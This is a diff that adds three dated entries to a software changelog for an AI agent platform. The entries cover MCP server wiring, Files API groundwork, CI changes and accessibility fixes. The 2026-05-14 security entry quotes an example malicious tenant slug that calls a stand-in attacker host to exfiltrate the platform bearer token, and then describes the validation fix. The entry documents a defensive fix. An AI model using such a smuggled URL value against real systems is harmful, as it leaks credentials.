@@ -8,6 +8,46 @@ Entries are published daily at 23:50 UTC.
 
 ---
 
+## 2026-05-16
+
+### 🔧 Fixes
+
+- **Hermes workspace MCP server tools now reach the agent loop**: the `molecule-ai/mcp-server` process was starting correctly on `127.0.0.1:9100` and the `/mcp` route was verified working (JSON-RPC `initialize` returned 12 tools), but the Hermes agent was not calling platform tools because `MOLECULE_MCP_SERVER_URL` was not wired into the Hermes `config.yaml`. The `start.sh` now sets `MOLECULE_MCP_SERVER_URL=http://localhost:9100` at startup, and the agent loop correctly connects. (`molecule-ai-workspace-template-hermes` [#22](https://git.moleculesai.app/molecule-ai/molecule-ai-workspace-template-hermes/pulls/22))
+
+### 🧹 Internal
+
+- **Platform Files API groundwork** (`molecule-core`): Phase 1–3 of the Files API roots RFC (`internal#425`) landed across four PRs — the `secrets` package now has a canonical credential-shape regex SSOT (`#1255`); the FilesTab canvas component gains an `/agent-home` root option and a secret-shape denial placeholder (`#1257`); the API gains a stub `allowedRoots` key with a 501 short-circuit (`#1247`); and the handler test suite was hardened to prevent data races during `db.DB` swap (`#1267`). These are infrastructure PRs that enable future per-container home directory isolation — the `/agent-home` root will be documented when the API ships.
+- **Scripts CI improvements** (`internal`): SOP tier-check now tolerates empty/invalid tokens while the token is being provisioned (`internal#431`); the `continue-on-error` guard on the PR-body gate is disabled when the runner backlog is draining to avoid silent pass (`internal#437`).
+
+---
+
+## 2026-05-15
+
+No customer-visible changes. All activity was internal infrastructure and SOP tooling.
+
+### 🧹 Internal
+
+- **Docs queue maintenance**: self-hosted Docker deployment guide, workspace ability flags (`broadcast_enabled` / `talk_to_user_enabled`) API reference, MCP server `broadcast_message` tool, CWE-78 `expandWithEnv` regression fix, OFFSEC-006 SSRF advisory, and OFFSEC-003 boundary-escaping fix all prepared in open pull requests — pending CI clearance and merge. (`docs` [#40](https://git.moleculesai.app/molecule-ai/docs/pulls/40)–[#49](https://git.moleculesai.app/molecule-ai/docs/pulls/49))
+
+---
+
+## 2026-05-14
+
+### 🔒 Security
+
+- **OFFSEC-006: tenant slug SSRF + token exfiltration in `promote-tenant-image.sh` fixed**: tenant slugs were interpolated into URL paths without sanitisation. A malicious slug such as `?url=https://attacker.com&token=$CP_TOKEN` could trigger SSRF or exfiltrate the platform bearer token. The fix adds RFC-1123 slug validation (`validate_slug()`) that rejects any slug not matching `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$` before any network call, and disables glob expansion of metacharacters with `set -f`. (`molecule-core` [#933](https://git.moleculesai.app/molecule-ai/molecule-core/pulls/933))
+
+### 🔧 Fixes
+
+- **Canvas accessibility round 3**: WCAG AA contrast fixes, focus-visible rings, and ARIA attribute corrections applied across `ConversationTraceModal`, `ErrorBoundary`, `ExternalConnectModal`, `MissingKeysModal`, `ProviderModelSelector`, and other canvas components. (`molecule-core` [#936](https://git.moleculesai.app/molecule-ai/molecule-core/pulls/936), [#949](https://git.moleculesai.app/molecule-ai/molecule-core/pulls/949))
+
+### 🧹 Internal
+
+- **CI/CD hardening** (`molecule-core`): publish workflow Docker healthcheck made pipefail-safe (`#952`); `sop-checklist` gate renamed from `sop-checklist-gate` (`#951`); `continue-on-error` flipped to `false` on platform-build CI (`#935`); `GITHUB_EVENT_BEFORE` fallback corrected (`#937`); publish deploy images on every main push enabled (`#939`).
+- **Test coverage additions** (`molecule-core`): OFFSEC-003 test assertions corrected for ZWSP-escaped values (`#946`); `executeDelegation` integration test calls updated (`#945`); unit tests added for `walkOrgWorkspaceNames` and `resolveParentOrgID` (`#941`).
+
+---
+
 ## 2026-05-12
 
 ### 🔒 Security
